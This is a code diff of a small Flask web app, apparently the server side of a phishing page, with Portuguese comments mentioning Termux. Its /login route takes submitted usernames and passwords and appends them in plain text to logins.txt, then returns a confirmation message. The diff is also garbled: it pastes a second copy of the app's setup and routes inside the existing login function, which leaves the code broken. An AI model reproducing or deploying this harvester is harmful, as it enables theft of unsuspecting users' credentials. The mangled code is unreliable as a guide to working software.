@@ -116,15 +116,24 @@ def logo():
 
 @app.route('/login', methods=['POST'])
 def login():
+    from flask import Flask, request, redirect
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return open("index.html").read()
+
+@app.route('/login', methods=['POST'])
+def login():
     user = request.form.get('user')
     password = request.form.get('pass')
 
+    # Guardar no arquivo
     with open("logins.txt", "a") as f:
         f.write(f"Usuário: {user} | Senha: {password}\n")
 
-    print(f"[LOGIN] Usuário: {user} | Senha: {password}")
-
-    return "<h3>Dados enviados! Verifique o Termux.</h3>"
+    return "<h3>Dados recebidos!</h3>"
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    app.run(host="0.0.0.0", port=10000)
